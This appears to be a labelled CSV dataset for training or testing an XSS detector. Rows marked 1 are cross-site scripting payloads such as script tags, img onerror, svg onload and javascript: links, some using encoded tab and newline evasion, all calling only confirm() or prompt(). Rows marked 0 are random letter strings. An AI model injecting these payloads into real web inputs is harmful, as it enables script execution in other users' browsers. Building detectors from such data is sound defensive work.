payload,label
<details ontoggle=confirm()>,1
mmtjxP XTrbZKVlnwXzDcHGkwCmZqJaxb,0
<script>confirm(1)</script>,1
yeayYKZutqgQYS EDuupFgOsRnpKzoTJWpL RY,0
<svg onload=prompt(1)>,1
UBxlrHewry wZJWGhpwpoQposBOLSZZdiwGMbQR,0
nNPJqSQ zCOrhew ,0
<%0aimg src=x onerror=prompt(1)>,1
<script>prompt(1)</script>,1
zCyLdRzJrNISXMlXI,0
sqxFWIBYgzuvFbhmrYxQvJ hDXNTL,0
<details ontoggle=confirm()>,1
lWShwyxZI ypwDuknxIqVvIsmz urfRlIePC,0
QePKfcPEhtbMoO U,0
IyUZkvWFwGKbxXYNCWUiJuHzYzxdTdonXLFz,0
DYyklWo ogVk tpdLnZbiyLxsOrbdVYh,0
EkQpMCNWNwBfWom uVZsHKhiycRm,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<details ontoggle=confirm()>,1
rGmrVpPChJEdTgmCkesVwYjGwAjOGelkAAzy waW,0
veIAnKFqolJm,0
<%09script>prompt(1)<%09/script>,1
<%0asvg onload=prompt(1)>,1
<%09details ontoggle=confirm()>,1
IZptdiYqqRMYlIjClWXyidCeyxLLRcWIKbX,0
iuHDyhcIQcksoBfIbxiOPjMxIksqxXubxfqCnWy,0
nXWrZE mBocrLlAHS T DCTdHmaWl,0
<details ontoggle=confirm()>,1
<%0adetails ontoggle=confirm()>,1
FhWsPasdOGwZwDxlAKUJsCNGMaWnUgZGNtTaGXv,0
<a href=javascript:prompt(1)>click</a>,1
vajBUpZHvowQonWCILjfyilgzYQOHnPBvxDJwnmq,0
<%09img src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
jhnPtwCv xzvQokcduxiyeJnZU,0
DsbKJczzrBCLUonNmjZ,0
<%09svg onload=confirm(1)>,1
<details ontoggle=confirm()>,1
<%0adetails ontoggle=confirm()>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
ISTOFWibMJ nsgXdlIoZiRUPWUrEHwHke,0
<img src=x onerror=confirm(1)>,1
EsabXNo HNNnTzW,0
<%0aimg src=x onerror=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
ygQSRGKPYliu,0
izxXRSSCCGBpfiIq,0
pjoJbYBvb sTlvTsFouPufFiIAicphmLAdUx,0
GdppSZVBAwqvPVNaTDtLRk,0
TsXfmpyEvLKi,0
 asEyNWVCbvbERNmUwoNFneTtwVIUhg MsZMr,0
FSeDALK wgOW,0
<%0adetails ontoggle=confirm()>,1
<%09img src=x onerror=prompt(1)>,1
eZeUboInPDf,0
<a href=javascript:prompt(1)>click</a>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
scbIVaSWQOWklLCoydl,0
<%0aimg src=x onerror=prompt(1)>,1
jzjtBE dpSxZQUoKEkXsr,0
<a href=javascript:confirm(1)>click</a>,1
exjiNfmYYzswnlq,0
<img src=x onerror=prompt(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
eZWmiHTBnuLIZIULqSRRMoKcKFPyOUQEyLlH,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%0adetails ontoggle=confirm()>,1
SxNIFhnrEbSiwNywQlt,0
<svg onload=prompt(1)>,1
BbPiRwTjss,0
es wIMgJwPpP PPgmLvYeNaDKfZzuJUCPGZEV,0
rGwqKJHhAaUABgiUGlxnokpiQSlI VipNm,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
rQHcSODIqZo BQeymYxGXNKGKKxYLNZUHdWz,0
tdTXOzwfJrjsExEDoxZiTGOyQswLhMple,0
fvtwUFUG hKjUUNAANOtXIp,0
<svg onload=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
 xKdgVPrXSnmNOLNLdBaUnzii,0
yRrWIuxXCIGdfoqKzoSVhSXRpJpDMUzR,0
rmwqSeOzXYhufAKieryd,0
<%0aimg src=x onerror=confirm(1)>,1
EOypRweaRTwweGCmFEhpnPB GOprcZQxCls,0
<img src=x onerror=prompt(1)>,1
aGpMpYAHgcfXkFvKwEVIJEeXkVIvASKqYIMH,0
bpcZHZWAxXeNClIR,0
lV HIlsMquafrK JqqihVwG,0
<%09details ontoggle=confirm()>,1
FHSREKhPZlH,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
F fFsGMRGuOUBGfxvtCBKXLEhxWYwwxBO,0
DHfxxCXjFIDjpuH,0
AxcfMKZSpBkAjk bXIxzVxpt,0
<%09script>confirm(1)<%09/script>,1
<%09details ontoggle=confirm()>,1
WQzXhumK SWnNBKxpqGQlLsp aVtp,0
fuHcdAZCtqtXZptDCYxDroEZ v,0
DWTFVqztqObqYSLYQrXeTwOlzlyZaX P,0
QpDAfdkrThNEaZFegfqyIDaFLkF UD,0
<img src=x onerror=confirm(1)>,1
PFuEsMtkqcSKmxRphHsnoXZfvODQDrQ,0
QxNthwTRxnsaLjcwARZRL NJeXgf rBcOM,0
<%09svg onload=confirm(1)>,1
<a href=javascript:prompt(1)>click</a>,1
GXhanfNSZzcHksffdjTCo,0
<img src=x onerror=prompt(1)>,1
wOYdsPKYHSdTRdvBZtE EilcvuxXmxnWoaqGELGq,0
PrIjWCSJruuxvDcPCKYmn,0
<%09img src=x onerror=confirm(1)>,1
OVMJnVzVdlxWdZGsSvxxEBqMPpdEDwiymwMGdOwM,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<svg onload=prompt(1)>,1
fHTupLMncZrER,0
dAOvkuiTnebYXyigoKnJ  BUQqSTJY,0
<%0adetails ontoggle=confirm()>,1
RLYBOQZeoCzGjeaUwDKttoYSgddENTECQoXib,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
ndBmhDVeMZQlMohmikeggvYcUqCQOWGVkubB,0
OrA kldKUIdJ,0
KUjvvNEYrznScHkzj,0
CnqbpTtWbVvhXQ IG,0
<%0ascript>confirm(1)<%0a/script>,1
<img src=x onerror=confirm(1)>,1
<img src=x onerror=confirm(1)>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
qvLMSPFgww oiLAkwUYAWrnrLrgTqTl,0
<%09img src=x onerror=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
<%09img src=x onerror=prompt(1)>,1
Gnvriwsrci XogQTbttyscPXh,0
<%0asvg onload=prompt(1)>,1
afOUOzMAClJLlBaaoCivvAAtVpiVxKN oJZBlqe,0
fmvaHiLxUAnT,0
eCvZWe yqzWnswRAgXkkFPWJdOGUYLNdw,0
<script>prompt(1)</script>,1
cXaBVYLIIwMv zYTwavfdRDstseufTIbekdMx q,0
jTfUCSjPhthlWl,0
<%0ascript>confirm(1)<%0a/script>,1
<%0asvg onload=confirm(1)>,1
JijGXDKTUaGDZFStaNnccpjoJzCSiSim,0
<img src=x onerror=prompt(1)>,1
qvIQVzpTpeyYmFgboXVVN,0
<a href=javascript:confirm(1)>click</a>,1
<%0aimg src=x onerror=confirm(1)>,1
PxB wghgYoIUOkqpCsgbKW,0
lfhUvSjhhxHwgbt,0
<details ontoggle=confirm()>,1
YLYYDfQwJbvDQKgqctzTLENHH,0
<script>prompt(1)</script>,1
rXuUBmiXfovsnTzGUegCHWTcV,0
AEdGrbcOuVRTMn,0
<%09img src=x onerror=confirm(1)>,1
<a href=javascript:confirm(1)>click</a>,1
NzdnuBgq vRwgryveZoUfqoTqPZg,0
dqUHxLbqVyPkGwqIdfC,0
<svg onload=confirm(1)>,1
pcYaLpRYlklvfDmyzrKc,0
rswOcuWqwLkeHkBOCZGNkteRZUXnblu,0
IendpRf gtQWNpVjaGcXyP,0
<%0ascript>confirm(1)<%0a/script>,1
YgKTzCvPFhiid zZihxZxOqtTsfHWr,0
ZqdBPtRnPZMBCnSJCgHnYxaZWJeslbMgY,0
ZiDEhBZHswFmloMbqefyBZmhIXnpMSOtGao,0
VjcyYXtaOKKXLiPpLBjxEaEhNcHbqstnVPa,0
<a href=javascript:confirm(1)>click</a>,1
hANzPEtULvHwGVXUIhpVcePPxFUlLLGMxLs,0
CIiTNpxEfKdogpD,0
<%09details ontoggle=confirm()>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
CJZVlibjYoCWlFkQn,0
<svg onload=confirm(1)>,1
vseaEGKEpYLavKDjePLIDaVSXE,0
SuSCDcWZwaFpKHnXmovfOsdIowdxNKKQR,0
<svg onload=prompt(1)>,1
<%09script>prompt(1)<%09/script>,1
kSacgIHBBpdbbxBKIuYocOm,0
mAiUOhrxqSAwZIyl KSofLwwmbT,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
<%09script>confirm(1)<%09/script>,1
kk DmtYNZfsRSV,0
<%09img src=x onerror=prompt(1)>,1
vbTmlPWpUKbpKIrd,0
GqCsZQ JaDJzkVhYXIguvXoyRUBxsi,0
LIHMvJCuzdEGSFP,0
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=prompt(1)>,1
ZFZKpcYTtRncFoiFAqhYoz,0
<%0asvg onload=prompt(1)>,1
<img src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
xsIQCsu dbslAyYRUxMQndpJA,0
smWnrzfMluhpWQQFoczCKiaKAHkoyjs,0
cdmgscDdVqJRbcRRkqbOiTfyo,0
kmjYJDfFmsaOiibatsa sLfV,0
OZXhFxRlXlLoqeDGjrzrF bnvMl,0
KSGMdbleJXxsaFcApDFRm,0
<%0aimg src=x onerror=confirm(1)>,1
WAuD oQreS,0
dzIyoMCvymujUDaNsMU,0
<%0adetails ontoggle=confirm()>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
sAyoibLLogh,0
QvYbyxXKcdADgCauecIyrZgLTfrm,0
EaafmfhBjtIzpWK,0
<%09details ontoggle=confirm()>,1
pKiTTqJGlPMfhnALffyNsLCrfVXDhEKhA,0
<%0aimg src=x onerror=confirm(1)>,1
YvtRaQgXwfZCNyWIaIei TNSVmtSw,0
<img src=x onerror=prompt(1)>,1
<%09svg onload=prompt(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%0ascript>prompt(1)<%0a/script>,1
XtxUDcBtBILayKJTITBz,0
pOzfBVNfevozsUMsoTilDahorbz,0
ZiqOhKGLIkfNWdZAuHxQarWQnjYq,0
<%09script>confirm(1)<%09/script>,1
irtoDSRfYF BtSyO,0
gLmPzolNfdb,0
RVzGvcLoqPR imdEJlxEFozAx,0
msthGUAILrNrZWGCPARqvOcpZV,0
SLaRBztyQzWWa P,0
NPnCxcAcLYHtgaZnLTwh kXjf,0
<%0ascript>prompt(1)<%0a/script>,1
<img src=x onerror=confirm(1)>,1
SGLCeOfVWNUJWYLIGUakJc,0
<%09script>confirm(1)<%09/script>,1
QRejCOpdtUAn IMVTXJK,0
wzhLnysgORe,0
<script>prompt(1)</script>,1
FQlCEbBTYylSNWTIdPSNsjcIlNpKwll,0
<%0aimg src=x onerror=confirm(1)>,1
XwemzpD Umx gckTyFvWzWPc,0
<details ontoggle=confirm()>,1
YMVWvkwAegNmWTCuVAEdntcV,0
<%09script>prompt(1)<%09/script>,1
<img src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
<%0asvg onload=prompt(1)>,1
GUgGRxVnSKG,0
KdWCtuHUMwoVH,0
CialUSpvNIGfiljlSjcgGLkK,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0aimg src=x onerror=confirm(1)>,1
 BygrTqWtmXfAegtcOGJJuccwCZ,0
sDtVQsBznXjusqbdIcuGXy,0
fGbojsfnZg ehVsfOjgkEdDJEcMoMf,0
OmbPlfgvUpSBtF,0
bspcXaccEkVOUrPkbGIEhhZEMpkVMB,0
WAcBalpXShpHipb,0
DLdoymFolowqKcmsLPntvpZH HREcqnsU,0
<img src=x onerror=confirm(1)>,1
FKnNJhjgtFowfdeDuxnoCQfZAKjeBz j,0
<svg onload=confirm(1)>,1
qDsUQPSpNicDwarK,0
<details ontoggle=confirm()>,1
CvTmurcAbXdW,0
iYdatXvNBZUFnlKytjVdUX,0
NMCGZHyaBb IuvR IdTw,0
sTYxDsympiiV RYSNozeDRJx,0
BfXSfGwRjbLXvAZqRTlLAM wXbm,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
FGilvWFTpiR,0
wwCmAymNPKEHlTrEsuP,0
<%0ascript>confirm(1)<%0a/script>,1
WyGlpqPrvYVNhFFrxVgBidpNMgFqVmI,0
<%09img src=x onerror=confirm(1)>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<svg onload=confirm(1)>,1
bBHqkDZNqLfSv hJGEeBcvQ Wyuji,0
<%0asvg onload=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
UcZMclGXSyXEydM IuVtQF,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
elnOgdBcSKnOwXGDBicKy,0
GHruALjXAypNFgapj,0
<details ontoggle=confirm()>,1
<script>confirm(1)</script>,1
vxqWLFEqSIwpSp,0
HFkNbSZJbzcaMsNpyafDZQKrpzapRGvdDqdac,0
XAaphoqHFnLtTHG,0
<script>prompt(1)</script>,1
<svg onload=confirm(1)>,1
PUXUGnhWzrwLLRGQRfP,0
NgITLLXrlcshwUfxrFAgVjVRwdkDxxNqyyNsU,0
oQpeYYDvGJpvcMRSMMH,0
<%09img src=x onerror=prompt(1)>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
FIH mPvwiHn,0
RNmXeLzeICCIVYXCeuMOVmEZETUYbrjooUNOnde,0
VHPqRskiZid,0
aCVcDWvnnpRrsIeXOj,0
<a href=javascript:confirm(1)>click</a>,1
hoblZxfoWpiaoIeEtEjTDXQhNoMdikHQWpanmvH,0
QMGgLdOPgMUNjv,0
BDlisCnaYGGvqfAwpDAAmgNvYCteeCtfeHeZTl,0
<%09details ontoggle=confirm()>,1
ftIooOPtrGFpoMTzEliTwUPrXVBHOE kcKwyr,0
CUNWaXbtsqYWPrBZXmznVGOLKNrz,0
STZuerIXGJdPrYiOfIGyWENWgxKFGcJpcyXGbHVi,0
<a href=javascript:confirm(1)>click</a>,1
YYgpLbUYNjtRcOrBpAlnjsWTcBzEuJw icAq,0
znpEymUUuxvcjR,0
wxziiHiODIMu,0
 jKMGDrilNKrZHNHMktiwHIi,0
s dYAuTiNieSUZcVihWtp,0
beeXBVnaQrvnWVNcViMNwgKCLhBu,0
<script>prompt(1)</script>,1
<%09svg onload=prompt(1)>,1
aCmFuylHJKjCFJlYtHVJEDsfCtThoebCmCStLIA,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<svg onload=confirm(1)>,1
pWbhgxQNYlVGdocFcHEfsAidwlhX,0
 UqtVQhzeOQy,0
<%09script>confirm(1)<%09/script>,1
wykTSwQUIdKhyBHsikkBtAMGwWNPLDvEe,0
IItPznTldLp dhVgsKpw,0
ssscnppsqkSB QDXIyADW kPPsWeWXvHuxQ,0
YfmWydfhUsGUFYNIVNk KNEnErsUdeSYCqVhTLoO,0
cHLYlgrUFhJOacDcDHtWqwhuINQq,0
vtIcFewZVjgaHE,0
ZokcRlMntJqvDbR,0
DRdUNwNkfIbtwkhVPr,0
<%09script>prompt(1)<%09/script>,1
MEFXylaCzrPtOuhnlOecRgCWTgvIFrEqMwSvX,0
hFQdbszBjrWyrMQYxlAApeo,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
IXQTGBIXndgYeVfCPhgODTaiZpHwzZu,0
NsJaegezYJjmNGXfoQgyUtHvQ ,0
PKOubuZFdpOyGnHlt,0
<%0adetails ontoggle=confirm()>,1
<%09script>confirm(1)<%09/script>,1
<%0aimg src=x onerror=confirm(1)>,1
JNHRIIhlzS,0
<details ontoggle=confirm()>,1
vqCCAkVJwqdW,0
ZbQvzEKQggFwCJJmKEQQoLDzytLyUwJH,0
<svg onload=confirm(1)>,1
<a href=javascript:confirm(1)>click</a>,1
<details ontoggle=confirm()>,1
F TFfayTpSzQXmPcdpvlZDZHMcY,0
vQevSrEtyjhcxRdON lRIXSAUdX,0
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<%09script>prompt(1)<%09/script>,1
pgZvuOSLmRrEgbBSQDGUlgnlZkOtqWwh,0
dkkCBXqPxkoIYZBwcSdtTY,0
dxmdBnBiKNSDEnBasJVklp,0
SOEFybHhmrvfvUUpjEqHYJpaFRmYB,0
NTQBCis pyQBjcIcVeObCbevLYl,0
UZMFFxIffCaDxDrzdXYYR,0
FcOwDoPLBBVAEijiNxXfsOpYFiP,0
dRtudOOcoxrBIOASEFKlBcGT,0
<svg onload=confirm(1)>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
XwEafrpIPJtWKs ZCaugB,0
ZYwinhtpvguuodUO,0
OFUJOhdTrGmzxcpnarac mWDoSUOfxqACBBVGdWA,0
<img src=x onerror=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
tszXWUlPcKlDTOgxManygxpyzabb,0
<script>confirm(1)</script>,1
<%0ascript>prompt(1)<%0a/script>,1
lKdfxPSozCydQYyWhfqaUjtHgxRVW,0
<%0adetails ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
rVxYoUKFaLQvLjpKpUGPugQkw,0
CvwwsflmvJQWyykdgXrwFkiNHZQTVHEJplO,0
<%09details ontoggle=confirm()>,1
x rFpsR eccQcuoOUzEuWFJ,0
QtPnsooyrgIdHxxIstsxrtACjtwWELXV wxcCSE,0
zUBOunLXfRSHAGhzTc,0
sRORZECYUjq N,0
M vfSHKvKCEYIDciaXQXxiBBaNDdbg,0
<a href=javascript:prompt(1)>click</a>,1
fiprxRpKFYMG urEmxMlyczpomyYvcet,0
tVnGYcklfLJEiAAYlSJNr,0
XyHZSrtXGmznmj,0
JVJpRWuKELLxlwLUEOaqs,0
<script>prompt(1)</script>,1
onADylrQIKCnt,0
iwSPjdgwhMYmyvSTDhTHFSmYGBVXUxGdgQYBC,0
<%0ascript>prompt(1)<%0a/script>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
MiDLeBGVfFeBgFngfrDLJwDTk,0
uySyFFhrNMoAHSNsGo SrrmluMtmZidgMNZcOKBw,0
<img src=x onerror=confirm(1)>,1
<%0adetails ontoggle=confirm()>,1
AxarKKdeAjleuuB,0
tMRNQWsoJxLznuZOtFuoQJeeC,0
hrDAPlDtFQzQmt,0
hJwOPVtOuZgloeniaTAcSfXTCOF,0
<%09details ontoggle=confirm()>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
GNKSCvmUJhuSfqASJTrbeLCowhtwOiRhbvUmQGpE,0
<img src=x onerror=confirm(1)>,1
FlavfDZDbVLOKQnYxidR,0
<%0ascript>prompt(1)<%0a/script>,1
dLbuZfNbBILcKFxfmvNxrFAgqqUXm Jzo,0
<%09img src=x onerror=prompt(1)>,1
<%0aimg src=x onerror=prompt(1)>,1
qdJKoebPzQC,0
<%0ascript>confirm(1)<%0a/script>,1
<img src=x onerror=confirm(1)>,1
<%09details ontoggle=confirm()>,1
OYJCnStsNZOTXXEjiYwzJpRTBpBD,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<%0aimg src=x onerror=confirm(1)>,1
nZhAziEACWOCye,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
BaPqVTGLtGUyblBJcVlTHQEygrzz,0
<script>confirm(1)</script>,1
cBbQHA xpLaQeeGpNBzKUyXzrPGsAAdmrHMRyx,0
TpEGtDEQrqcFEYKIhSTkydD,0
woWIhxOfjwDQUQPIHGruutzV,0
tvazvqBSFkRAqCAARNxZg,0
lHmTPqqosHmUnIE,0
<%09svg onload=prompt(1)>,1
<%0aimg src=x onerror=confirm(1)>,1
xAZwIGwhwshWZoGPudzPRugN,0
<%0ascript>confirm(1)<%0a/script>,1
<%0aimg src=x onerror=confirm(1)>,1
NfITP DduGjXzPA,0
<%0aimg src=x onerror=prompt(1)>,1
<img src=x onerror=prompt(1)>,1
FhJPsSRQQHPYjaKPrxQAcIlQXoAFGkS,0
<img src=x onerror=confirm(1)>,1
PMWnJRTXXfzYUCxStfSHnlUJBpTTHHoLJxGuyVIa,0
KSWWLSUFWXeBqyJoOmFvDvfgaZ ,0
<img src=x onerror=confirm(1)>,1
LQKL JdJlahJYWdnuZDfEFlBzQuPrz ,0
InrfrfhYxLtNhYrtHoMjpIiiKSDTcoMvDfMqKewm,0
<svg onload=prompt(1)>,1
WXEAzSJmSSHdJuTOHNqYSIWYmKbonD,0
kYXomGWvNTnifQwXbPmhGLBLTjfGlqltYThIYg,0
XVKgcuajkQ yJWjCSONq,0
<%09script>confirm(1)<%09/script>,1
<a href=javascript:prompt(1)>click</a>,1
vdXqWkcAKZXXQbzPvdodoBKgjJJKHuDuBDKDRS,0
ObBNCdEodPQtuDGUJhvjtmxEFXnXYojYII,0
<img src=x onerror=prompt(1)>,1
VQLJHijANFluqYYod,0
NPvZgDCIikGnXjCFOSVLbUXeOCiysl,0
<%0adetails ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
fVrF DkXnp cvtUrkKjfijOPbZOfIYUrczVWP,0
rh KcRMUWbEeJJC gYGzO,0
<%09details ontoggle=confirm()>,1
GMYaGKkLmqYagaoFIxDFbGVIzxPmEIE,0
<%09svg onload=confirm(1)>,1
JDmkQccfiIktxECoOFybQSnVlJUVlctoclCO,0
<details ontoggle=confirm()>,1
<%0aa href=javascript:confirm(1)>click<%0a/a>,1
<img src=x onerror=confirm(1)>,1
RZmHLPykaSl fMvlZcuLoDPTLBx,0
GIMoRFTYPLZaemZqDGAdMiEgeXklX AC,0
<%09a href=javascript:prompt(1)>click<%09/a>,1
GDKSkXHZGGzlWBdKgwIvZzVf,0
<%09script>confirm(1)<%09/script>,1
WeCrfCdipWIdWpgHXogzNoilMUaJqIaCsHpoO,0
PqAmbgzSchDBjSyEyElFPcai czq,0
QpHvApbFPEmzPGlOVqwqhSG,0
wCfxBYINgvotWCasaLf,0
<%09details ontoggle=confirm()>,1
<details ontoggle=confirm()>,1
<%09details ontoggle=confirm()>,1
hbufDqwwXpO Qg,0
apoIAVnTCTHSOINHdiTnxv,0
<details ontoggle=confirm()>,1
sUjMVtGzHdmiuEIhPlUqehKtYuZKHrq,0
nFuoLjlaslXJsOpuVy,0
oWEKrpUatClBADhwcgiDLegULtFZHLlCZGepZBF,0
EjjnGUdppLKJvziwEmfcZKEgEmLzfl,0
<details ontoggle=confirm()>,1
<%09script>prompt(1)<%09/script>,1
<script>confirm(1)</script>,1
<%09script>confirm(1)<%09/script>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
HjxtflPRggodXAqNVFJRTtWPCkDpbskeaZJUH,0
fiFvgmESDnHnyfxSVIbzoW CnbeWpXRdHllcdg,0
qwvUGbQRaOquKEVPazYkLXvHOUyVbJKNYJvawhXM,0
HDornYplkMpiWvjKQLxdSWUmxNlUtwHg,0
<%09script>prompt(1)<%09/script>,1
TtVSSVKshioolTNk,0
<%0adetails ontoggle=confirm()>,1
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
mWrJKEXNErMPxBjNiTqhgkCB ,0
<%0aimg src=x onerror=confirm(1)>,1
UxTzvTCQVJruWkwhbXGNPErJdR,0
kNjCNAypdFPoludutkC,0
<script>prompt(1)</script>,1
<details ontoggle=confirm()>,1
<%0ascript>confirm(1)<%0a/script>,1
wpdYUgkPpAR,0
IjQUPDfMiGroAfNqGkMYOJVbq,0
<%0asvg onload=prompt(1)>,1
xVCOAhvYjDe,0
<img src=x onerror=prompt(1)>,1
bkYQnRULDaolISWSZuTmiYUc,0
<%09details ontoggle=confirm()>,1
FoOzwLAkiSgTN,0
nqrhtPykHbRwYccBRD,0
<svg onload=confirm(1)>,1
<details ontoggle=confirm()>,1
aTzYJawXgjZthihEvGuFOowLNDZ,0
<%09svg onload=prompt(1)>,1
Swrkff CyRNjTKEunNwUgLDdYXGzKbPTe,0
AvCpMwRW OgYgUNhAOtX,0
ZbfEERsUByYfuzWObBIbiPNjHVZLqrWV,0
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09a href=javascript:prompt(1)>click<%09/a>,1
qudctloXwY eGFHdX gnpNqTVkaeTDnjXDCqWDIR,0
 Zv UO ucZbvnMypfZneQQgjxveha,0
<%09img src=x onerror=confirm(1)>,1
<details ontoggle=confirm()>,1
<%0ascript>confirm(1)<%0a/script>,1
dhBaBGGsZFRkhpT,0
lNkVgErqhnM,0
ponRTFoJXdmWbpeCjq ,0
ddioGdietOjZcxcQbkeNBufaWIEfpdiLokNPh,0
ifCdfwdXBhAqy,0
<img src=x onerror=prompt(1)>,1
<%0ascript>prompt(1)<%0a/script>,1
<%0adetails ontoggle=confirm()>,1
lCzqNGiyWMFUXUlaNJIKQQT,0
b daCqJBrMXdeaWstMXjXKFQD,0
wkWuBnYerKZWJA,0
aUKLfBceThJWcDxDGZsVdGuqRdcoHkRLUs ,0
NhFxmUVpbRkozWFBTqHBiumfCyueywtfOS,0
pC UwddMZyd,0
FNPDQQWuCEYYk,0
wzdofEUVNftIQFTEsardlPCLe,0
tgCpfiSxZYLheZifoCAlYlqraXIVoWs,0
KhpIfiPqyGGtKKRxEp,0
<%09script>prompt(1)<%09/script>,1
epvkcLAgq ev,0
<%09svg onload=prompt(1)>,1
<%09script>confirm(1)<%09/script>,1
<svg onload=confirm(1)>,1
LWDnEEnOswwjRfVYvwLNUMsvHaXzAPkvuIRvh,0
<%0adetails ontoggle=confirm()>,1
<%0ascript>confirm(1)<%0a/script>,1
wJnMjiRAFJHKAYSseXhPuAzFfHWXi,0
<%09details ontoggle=confirm()>,1
<img src=x onerror=prompt(1)>,1
HzeacFTAUQTgrRGYrvYhtEHvWEoEBEbvUlXHG,0
<%0ascript>confirm(1)<%0a/script>,1
<%09a href=javascript:confirm(1)>click<%09/a>,1
<%09img src=x onerror=prompt(1)>,1
gmgiDOprxRHInc rfMgINfzHhSV,0
eSZLbJQlTonIcMAVIBnYhMEajppuPGNAuEfixe,0
MpKcZcWMCVFhOyVq bzwGcFqoMf,0
jcRdTgBNdMRdLPnRxxRcNuPgHIaMBCXjlHRWyY,0
dvQosudHqvZPcnXpMkrTHwIddUtPSNMu,0
Vu fFRTVBuZlTWReWZj wwJyCmzPqJO,0
IlTCZOQKTQmRyBbLsVAGnTGnx,0
<%09details ontoggle=confirm()>,1
<%09svg onload=prompt(1)>,1
au QzMOoKGEVDic L,0
sQMfRzHucrHHigoGQTs,0
NAyCFQENvjAxSJ,0
GQNKGYjsLxJgAauiaTrywt xj,0
HVvMOjOiViJNwCLXvOdWnWUmstanKlQ DpXvR,0
MXCOKKQdAtDBUrRXcVJT,0
wTTBiVxxsRWTO DVnoi,0
njlgGWIZpaINo Uypyd NpDUKPmghSqtTya,0
BmULBUDAuEaujH,0
nzScLOskgwcgDMdHfpWhFVPOJHcsfhrBbSoqw,0
<%09details ontoggle=confirm()>,1
<%09script>confirm(1)<%09/script>,1
<%09details ontoggle=confirm()>,1
kWNPuP gMFvywWadKNdAcLvqCMBAAOh eUM,0
WtZiMvsSbz lpaeTIJytkMEg  dTPHkSuLg,0
<%0aa href=javascript:prompt(1)>click<%0a/a>,1
<img src=x onerror=confirm(1)>,1
gJWFGzEPBV,0
<%0adetails ontoggle=confirm()>,1
PRBGrckyYSsLakyYvp,0
CdkuaFuJMWGZccwwpHOIY KEKdlMbPtdVZWId,0
<script>prompt(1)</script>,1
<%0ascript>confirm(1)<%0a/script>,1
 qhItyvNVhaGPlh,0
TrPiWLgxNIQvjmhtLfhBaUVtgw jq,0
vGVLlFCCBY,0
<%0ascript>prompt(1)<%0a/script>,1
CMHiZAABJyiArnshZWLJ rTs,0
<%0asvg onload=confirm(1)>,1
<%0asvg onload=confirm(1)>,1
<%09svg onload=confirm(1)>,1
<details ontoggle=confirm()>,1
hqSHVZvIPiOze kDnWdOKVGzDeqzThASfObRrWe,0
<svg onload=prompt(1)>,1
